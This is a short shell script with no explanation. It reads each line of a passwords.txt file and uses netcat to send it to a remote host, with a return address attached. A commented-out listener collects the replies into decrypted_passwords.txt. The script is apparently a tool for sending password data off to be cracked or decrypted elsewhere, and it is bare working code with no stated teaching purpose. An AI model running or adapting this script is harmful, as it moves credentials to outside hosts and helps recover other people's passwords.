# nc -l -k 128.114.59.29 4103 | tee -a decrypted_passwords.txt
# echo $line 128.114.59.29 4004 | nc 128.114.59.42 2001

filename=passwords.txt
port=4104
while IFS='' read -r line || [ -n "$line" ]; 
do
	echo $line 128.114.59.29 $port | nc 128.114.59.42 2001
done <"$filename"

